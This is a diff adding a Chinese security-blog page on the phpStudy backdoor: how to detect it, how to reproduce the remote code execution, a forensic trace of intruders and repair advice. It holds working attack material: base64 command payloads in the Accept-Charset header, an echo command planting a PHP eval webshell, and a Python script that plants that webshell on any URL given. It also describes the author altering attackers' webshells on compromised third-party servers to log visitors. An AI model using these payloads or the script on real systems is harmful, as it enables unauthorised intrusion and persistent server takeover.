@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析 | Gridea</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1636253538702">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析</h1>
+            <p class="article-meta">
+              2021-11-03
+              
+            </p>
+            
+            <div class="post-content">
+              <p>文章目录:</p>
+<p>1.phpstudy后门检测</p>
+<p>2.phpstudy远程RCE后门复现图文教程</p>
+<p>3.phpstudy远程RCE后门复现教视频程</p>
+<p>3.Python编写复现脚本</p>
+<p>4.Python编写批量复现脚本</p>
+<p>5.针对部署phpstudy环境服务器已沦陷的主机进行溯源分析/黑客入侵画像</p>
+<p>6.修复建议</p>
+<p>7.参考</p>
+<p>准备工具：</p>
+<p>VMware Workstation Pro</p>
+<p>Windows7的/ 2008R2</p>
+<p>BurpSuiteFree</p>
+<p>phpStudy20161103.zip（文中使用）phpStudy20180211.zip</p>
+<p>Python</p>
+<p><strong>一、phpstudy后门检测：</strong><br>
+(1)phpStudy20161103 后门位置存在于：</p>
+<pre><code>*:\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll
+
+*:\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll
+</code></pre>
+<p>(2)phpStudy20180211后门位置存在于：</p>
+<pre><code>*:\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll
+
+*:\PHPTutorial\PHP\PHP-5.4.45\ext\php_xmlrpc.dll
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932261789.png" alt="" loading="lazy"><br>
+(3)找到“ php_xmlrpc，dll”后用记事本打开，“ Ctrl + F”搜索“ @eva ”字符串如果存在就存在后门：</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932265747.png" alt="" loading="lazy"><br>
+(4)Phpstudy后门分析文章传送门：</p>
+<pre><code>https://www.freebuf.com/news/topnews/214912.html
+
+https://www.cppentry.com/bencandy.php?fid=85&amp;id=261791
+</code></pre>
+<p><strong>二、phpstudy远程RCE后门复现图文教程:</strong><br>
+(1)虚拟机搭建好Phpstudy环境，我这里使用的是phpstudy2016版本<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932271003.png" alt="" loading="lazy"><br>
+Phpstudy环境192.168.1.91</p>
+<p>(2)浏览器访问靶机地址：http：//192.168.1.91/<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932276373.png" alt="" loading="lazy"><br>
+(3)浏览器设置本地代理并且打开BurpSuiteFree抓包<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932281265.png" alt="" loading="lazy"><br>
+<strong>(4)phpstudy RCE POC：</strong></p>
+<pre><code>GET / HTTP/1.1
+
+Host: 192.168.43.99
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:69.0) Gecko/20100101 Firefox/69.0
+
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip,deflate
+
+Accept-Charset:&quot;commandbase64 string&quot;
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Cache-Control: max-age=0
+</code></pre>
+<p><strong>(5)CTRL + R把请求包转发到中继器模块</strong></p>
+<p>Accept-Charset:&quot;command base64 string&quot;中执行命令经过了的的Base64编码加密：</p>
+<p>执行语句指令：system('whoami');</p>
+<p>BASE64 编码后：c3lzdGVtKCd3aG9hbWknKTs =</p>
+<p>替换进去</p>
+<p>Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=</p>
+<p>还要把“ ”中的前面的空格删除。Accept-Encoding: gzip, deflatedeflate</p>
+<p><strong>(6)构造好执行语句为WHOAMI的POC如下：</strong></p>
+<pre><code>GET / HTTP/1.1
+
+Host: 192.168.1.91
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64;rv:69.0) Gecko/20100101 Firefox/69.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip,deflate
+
+Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Cache-Control: max-age=0
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932289618.png" alt="" loading="lazy"><br>
+（whoami执行结果）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932294964.png" alt="" loading="lazy"><br>
+（net user执行查询查询查询查询结果）<br>
+(7)写入webshel升的操作</p>
+<p>可以使用待办事项命令下ECHO 实现</p>
+<p>系统（“ write_webshell”）；</p>
+<p>(8)完整写出webshel升的语句：</p>
+<pre><code>ECHO ^&lt;?php @eval($_POST[cmd]);?^&gt;&gt;&quot;C:/phpStudy/WWW/demon.php
+</code></pre>
+<p>(10)拼接后的语句</p>
+<pre><code>system(' ECHO ^&lt;?php@eval($_POST[cmd]); ?^&gt;&gt;&quot;C:/phpStudy/WWW/demon.php ');
+</code></pre>
+<p>(11)拼接好Base64 编码后的代码：</p>
+<pre><code>c3lzdGVtKCcgRUNITyBePD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Xj4+IkM6L3BocFN0dWR5L1dXVy9kZW1vbi5waHAgJyk7
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932301784.png" alt="" loading="lazy"><br>
+（成功写入的webshel）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932311623.png" alt="" loading="lazy"><br>
+（中国蚁剑连接成功）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932316526.png" alt="" loading="lazy"><br>
+（ 中国蚁剑链接的webshel升命令执行成功）<br>
+<strong>三、Python复现phpstudy远程RCE漏洞：</strong><br>
+(1)Python 编写Phpstudy2016 / 2018远程RCE利用脚本代码：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932321772.png" alt="" loading="lazy"></p>
+<pre><code>import base64
+import requests
+print(
+'''        ==============================================================================================                    &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;Phpstudy 2016/2018 远程 RCE Getshel工具&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;                    [+]By:艾登——皮尔斯                    [+]脚本仅用学习教育目的                    [+]请您务必遵守《中华人民共和国网络安全法》        ==============================================================================================        ''')
+def write_shell(url,headers):
+r = requests.get(url=url, headers=headers)
+cheack_webshell = requests.get(url+&quot;/demon.php&quot;)
+if cheack_webshell.status_code == 200:
+print(&quot;\n\n[+]{}                Webshell写入成功&quot;.format(url))
+else:
+print(&quot;\n\n[+]{}                Webshell写入失败&quot;.format(url))
+print(&quot;\n=======================================================\n\n&quot;)
+while True:
+path = input(str(&quot;请你输入绝对路径:&quot;))
+url = input(str(&quot;请你输入IP地址/域名:&quot;))
+payload_qury = &quot;&quot;&quot;system('ECHO ^&lt;?php @eval($_POST[cmd]); ?^&gt;&gt;&quot;{}/demon.php&quot;');&quot;&quot;&quot;.format(path)
+payload = base64.b64encode(payload_qury.encode('utf-8'))
+payload = str(payload, 'utf-8')
+headers = {
+'Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','Accept-Language': 'zh-CN,zh;q=0.9','accept-charset': payload,'Accept-Encoding': 'gzip,deflate','Connection': 'close',}
+write_shell(url=url, headers=headers)
+</code></pre>
+<p>(2)我们可以看到上面的这个Python复现phpstudy远程RCE的脚本针对于单一命令的phpstudy部署的站点例如这种界面额的还比较方便，如果我们不知道绝对路径是不是就不能写入webshell了?????其实这并不会!!!!</p>
+<p>(3)针对于phpstudy指针页面无法访问的我们其实可以枚举一下他的物理路径地址即可，不知道绝地路径可以枚举一下物理的绝对理解</p>
+<pre><code>Path=['C:/php/WWW',&quot;D:/php/WWW&quot;,&quot;E:/php/WWW&quot;........]
+</code></pre>
+<p>然后把列表中的绝地地址元素传入函数中递归请求判断即可，这里就不贴出代码了。</p>
+<p>(4)与此同时各位老表在进行枚举检测，但是作为一个白帽子，千万不要越过红线。建议大家检测的时候不要写入一句话木马，直接写出一个phpinfo();比较好也是保护了自己。<br>
+<strong>四、针对部署phpstudy环境服务器已被入侵的主机进行溯源分析:</strong><br>
+(1)我在进行随机检测phpstudy的时候已经发现了部分感染主机被黑帽SEO利用了，用于增加搜索引擎关键词的排名来吸引流量。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932352223.png" alt="" loading="lazy"><br>
+(2)部分检测到存在漏洞phpstudy服务器主机网站根目录下高频出现的php一句话木马文件名如下:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932358617.png" alt="" loading="lazy"><br>
+(3)下面的这三位仁兄(大黑客)就是通过了echo的方式写入了webshell一句话木马到网站的根目录下进行链接，先放到一边后面在一起做后门取证。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932373575.png" alt="" loading="lazy"><br>
+(4)另类的后门“lishunsheng.php”应该是一个人名的拼音，应该是李姓氏的<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932380920.png" alt="" loading="lazy"><br>
+ZnB1dHMoZ**wZW4oJy4vdGVzdC5waHAnLCd3KycpLCc8P3BocCBldmFsKCRfUE9TVFtjXSk7Pz4nKTs=</p>
+<p>(5)解密后<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932385721.png" alt="" loading="lazy"></p>
+<pre><code>fputs(fopen('./test.php','w+'),'&lt;?php eval($_POST[c]);?&gt;');
+</code></pre>
+<p>(6)写出文件名为&quot;text.php&quot;链接密码为“c”的webshell一句话木马到网站根目录下方</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932390942.png" alt="" loading="lazy"><br>
+(7)还有其他的黑客是通过phpmyadmin登录弱口令密码的系统日志文件写入webshell进来的<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932395954.png" alt="" loading="lazy"><br>
+2019年9月23日17时30分33秒写入<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932400507.png" alt="" loading="lazy"><br>
+2019年9月23日18时16分33秒写入webshell<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932408949.png" alt="" loading="lazy"><br>
+(8)上面在9月23日写入webshell一句话后，大黑客又通过一句话木马webshell上传了一个文件名为“001122.php”的webshell不死马基本可以先贴个标签是同一个大黑客的攻击入侵行为，在这里也可以看出phpstudy一键部署应该把phpmyadmin的默认密码给修改成随机字符串，此前就有安全团队针对此问题被黑产批量getshell的活动进行了分析。<br>
+<strong>五、针对部署phpstudy环境服务器已沦陷的主机进行溯源分析/黑客入侵画像</strong><br>
+(1)我们现在已经拿到了那些黑客的的webshell一句话后门文件现在就要开始溯源黑客的IP地址，emmmmm，由于我不能直接登录受感染的主机查看访问日志文件，那么这就会非常的尴尬，但是我突然想起了之前我之前给广东省某市的网络执法机构做了一个用来记录黑客访问webshell一句话时候的IP地址的脚本，并且通过邮件或者微信把信息发送给执法人。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932415604.png" alt="" loading="lazy"><br>
+(2)但是在检测之前我需要对他们的webshell一句话木马做一下加工处理，黑客原先留下的webshell代码如下:</p>
+<pre><code>&lt;?php
+
+@eval($_POST[ppass]);
+
+?&gt;
+</code></pre>
+<p>(3)我们加工处理黑客留下的后的webshell代码如下</p>
+<pre><code>&lt;?php
+
+$address = $_SERVER['REMOTE_ADDR'];
+
+$referer = $_SERVER['HTTP_REFERER'];
+
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
+$file = fopen(&quot;log.html&quot;,  &quot;a&quot;);  
+
+$time = time();
+
+$now_date= date('Y-m-d H:i:s',$time);
+
+fwrite( $file, &quot;&lt;b&gt;Time:$now_date&lt;/b&gt;&lt;br&gt;&quot; );
+
+fwrite( $file, &quot;&lt;b&gt;IP Address:$address&lt;/b&gt;&lt;br&gt;&quot;);
+
+fwrite( $file, &quot;&lt;b&gt;Referer:$referer&lt;/b&gt;&lt;br&gt;&quot;);  
+
+fwrite( $file, &quot;&lt;b&gt;Browser:$browser&lt;/b&gt;&lt;br/&gt;&lt;hr&gt;&quot;);  
+
+fclose($file);
+
+@eval($_POST[ppass]);
+
+?&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932422821.png" alt="" loading="lazy"><br>
+(4)log.html的路径地址可以修改到存放到网站根目录下的其他文件下，避免被发现哈哈哈，</p>
+<p>当黑客使用中国菜刀/中国蚁剑访问webshell的时候就会记录下IP地址/访问时间/请求头等信息到log.html文件中</p>
+<p>(5)模拟黑客访问webshell前<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932428328.png" alt="" loading="lazy"><br>
+(6)模拟黑客访问websell后<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932433179.png" alt="" loading="lazy"><br>
+(7)然后本地或者VPS上定时访问请求log.html把最新的访问信息通过Email邮件的方式发送给执法机关/溯源工程师，<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932440617.png" alt="" loading="lazy"><br>
+(8)访问检测已经可以达到了秒级，时间的精度也是非常之高。然后就给全部黑客的webshell加工一下，然后我们在调用本地的脚本使用一个并发的请求去请求所有的站点log.html静静等待邮件即可。但是这里并不建议并发请求容易被防火墙封锁IP，所以我就使用了单线线程模式并且使用tiime模块的time.sleep设置了请求延迟，我设置了10秒访问一次。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932449389.png" alt="" loading="lazy"><br>
+(9)设置完毕之后就可以直接运行监听脚本了<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932455022.png" alt="" loading="lazy"><br>
+(10)在经过十多个小时的等待,我终于等待到了那些大黑客重新访问他们预留下来的Webshell地址了，手机QQ邮箱也收到了邮件通知<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932471034.png" alt="" loading="lazy"><br>
+(11)本次等待共获取到144条webshell访问记录，主要的访问IP地址如下:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932478190.png" alt="" loading="lazy"><br>
+(12)此外我还注意到网站的根目录文件夹下方被上传了远程木马病毒(方便黑客后期长时间维持权限访问)如下图：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932485387.png" alt="" loading="lazy"><br>
+<strong>那么接下来就是进行给黑客入侵画像：</strong><br>
+<strong>(1)Windows7 64bit System 虚拟机样本未运行初始化状态</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932491344.png" alt="" loading="lazy"><br>
+(2)执行cd.exe程序后本地端口49189端口被占用，链接的外部C&amp;C的上线地址:114.67.65.156:8081</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932498069.png" alt="" loading="lazy"><br>
+(3)查壳:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932505182.png" alt="" loading="lazy"><br>
+<strong>UPX压缩壳使用C++编写的win32木马程序</strong></p>
+<p><strong>火绒剑分析:</strong><br>
+(1)运行后会删除自身文件(cd.exe)并且会复制自身到C:\Windows下方<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932521335.png" alt="" loading="lazy"></p>
+<pre><code>C:\Windows\system32\cmd.exe&quot; /c del C:\Users\ADMINI~1\Desktop\cd.exe &gt; null
+</code></pre>
+<p>删除母体<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932529492.png" alt="" loading="lazy"><br>
+写入木马文件到C:\Windows\目录下</p>
+<p>(2)注册行为:修改了以下注册表以此降低Internet安全设置。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932541636.png" alt="" loading="lazy"><br>
+(3)向网关地址发送数据包：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932549334.png" alt="" loading="lazy"><br>
+(4)与114.67.65.156:8081C&amp;C上线服务器地址建立TCP通信链接<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932555222.png" alt="" loading="lazy"><br>
+114.67.65.156主机3389端口开放(Windows主机无疑)<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932561148.png" alt="" loading="lazy"><br>
+(5)开启了web服务80端口访问IP发现有一个网站<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932569605.png" alt="" loading="lazy"><br>
+(6)发现是一个做SEO的泛微目录的站点，留意到网站上面留下了这个站长的微信二维码<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932588873.png" alt="" loading="lazy"><br>
+微信号尾号为H****553YM</p>
+<p>QQ:64****08</p>
+<p>就先叫他53YM大黑客<br>
+(7)纯真IP库查询IP的归属地指向了一家名为&quot;北京市 凯达永易科技(北京)有限公司&quot;的公司<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932595542.png" alt="" loading="lazy"><br>
+去天眼查网站查询这家公司发现公司已注销<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932605318.png" alt="" loading="lazy"><br>
+(8)然后我顺便去Google搜索了一下这个C&amp;C上线地址,发现已经有安全团队分析了类似样本</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932617274.png" alt="" loading="lazy"><br>
+2018.exe 211.149.225.80:3313(大灰狼木马)</p>
+<p>inJoin.ps1是一个远程注入工具该PowerShell脚本具有3个基本功能集：<br>
+DLL注入<br>
+DLL注入简单地定义为将DLL插入另一个进程的空间然后执行其代码的过程。以下是OpenSecurityResearch博客文章中对此过程进行简化的可视化视图：<br>
+1.）将DLL反映性地加载到PowerShell进程中</p>
+<p>远程或本地运行时，可以将DLL输出返回给用户。</p>
+<p>DLL完成执行后，清理PS进程中的内存。</p>
+<p>2.）将EXE反射性地加载到PowerShell进程中。</p>
+<p>远程运行时无法将EXE输出返回给用户。如果需要远程输出，则必须使用DLL。如果在本地运行，则可以返回EXE输出。</p>
+<p>DLL完成执行后，清理PS进程中的内存。</p>
+<p>非常适合运行EXE的现有渗透测试工具，而无需触发过程监控警报。</p>
+<p>3.）以反射方式将DLL注入到远程进程中。</p>
+<p>在远程或本地运行时，无法将DLL输出返回给用户。</p>
+<p>如果DLL完成执行，则不清理远程进程中的内存。</p>
+<p>非常适合通过将后门DLL注入另一个进程内存来在系统上植入后门。</p>
+<p>期望DLL具有此功能：void VoidFunc（）。这是在DLL加载后将被调用的函数。</p>
+<p>如果通俗点用人话来讲就是利用PowerShell来远程注入DLL的脚本</p>
+<p>此PowerShell项目的Github项目地址:</p>
+<pre><code>https://github.com/clymb3r/PowerShell
+</code></pre>
+<p>此PowerShell项目作者的说明：</p>
+<pre><code>https://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932627565.png" alt="" loading="lazy"><br>
+这里的江西赣州的黑客所使用的就是上图红圈选圈中的PowerShell脚本</p>
+<p>然后查看他一下他的PowerShell脚本<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932640308.png" alt="" loading="lazy"><br>
+其中$InputString是黑客把自己的恶意的二进制文件通过Base64转写后的字符串信息</p>
+<pre><code>在通过PowerShell[System.Convert]::FromBase64String的方法是为上面二进制文件加密的字符串信息进行解密执行
+</code></pre>
+<p>InputString中Base64编码的字符串解密还原后为Metasploit生成的二进制文件。</p>
+<p>PowerShell还原解密方式:</p>
+<pre><code>$Base64Bytes = Get-Content (base64.txt)
+$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)
+Set-Content calc.exe -Value $PEBytes
+</code></pre>
+<p>C#还原解密方式：</p>
+<pre><code>using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+namespace test1
+{
+class Program
+{
+static void Main(string[] args)
+{
+byte[] AsBytes = File.ReadAllBytes(@&quot;C:\test\base64.txt&quot;);
+String AsBase64String = Convert.FromBase64String(AsBytes);
+StreamWriter sw = new StreamWriter(@&quot;C:\test\calc.exe&quot;);
+sw.Write(AsBase64String);
+sw.Close();
+}
+}
+}
+</code></pre>
+<p>这个江西赣州的黑客够专业我喜欢<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1635932652689.png" alt="" loading="lazy"><br>
+inJoin.ps1 上线地址为117.21.224.222:9898</p>
+<p>木马文件名及上线地址如下图所示：</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1635932661253.png" alt="" loading="lazy"><br>
+修复建议:<br>
+1.前往官网下载phpstudy下载最新版本</p>
+<p>2.修改服务器密码，检查系统日志文件，下载安装火绒杀毒软件进行全盘查杀病毒后门，以防生产环境被入侵者留下后门</p>
+<p>2.开发人员应该尽量在生产环境中杜绝使用一键部署类型的软件和脚本防止软件留有后门，导致服务器病毒木马入侵</p>
+<p>3.关注多一些风险预警平台&quot;微步&quot;/或者关注威胁情报收集的微信公众号&quot;黑鸟&quot;还有就是我的winway-鱼蛋师傅的漏洞挖掘公众号&quot;快识&quot;。</p>
+<p>参考:<br>
+<strong>phpStudy后门简要分析：</strong></p>
+<p>http://www.freebuf.com/others-articles/215406.html</p>
+<p>数十万PhpStudy用户被植入后门，快来检测你是否已沦为“肉鸡”！:</p>
+<p>https://www.freebuf.com/news/topnews/214912.html</p>
+<p>杭州警方通报打击涉网违法犯罪暨'净网2019'专项行动战果</p>
+<p>https://mp.weixin.qq.com/s/s-5cVTxIJcDfdRjtnEnI0g</p>
+<p>病毒团伙利用phpStudy RCE漏洞批量抓鸡，下发四个远控木马</p>
+<p>https://www.4hou.com/system/20637.html</p>
+<p>渗透技巧——通过cmd上传文件的N种方法</p>
+<p>https://wooyun.js.org/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html<br>
+本文作者：艾登——皮尔斯， 属于FreeBuf原创奖励计划，未经许可禁止转载，这里我只是借来参考一下</p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://jinqipiaopiao.github.io/post/wpscan/">
+                <h3 class="post-title">
+                  wpscan
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1636253538702" class="no-responsive avatar">
+    <div class="text-muted">温故而知新</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/">PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/wpscan/">wpscan</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/hui-bian-yu-yan/">汇编语言</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/">浅谈文件上传漏洞</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/">常见的解析漏洞总结</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/2021-9-4-kai-xue-bi-ji/">2021-9-4开学笔记</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">暑假学习笔记记录</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">SQL注入过滤字符的Fuzz脚本测试</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">md5相关比较</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/buuctf/">BUUCTF</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge warning">
+          Gridea
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
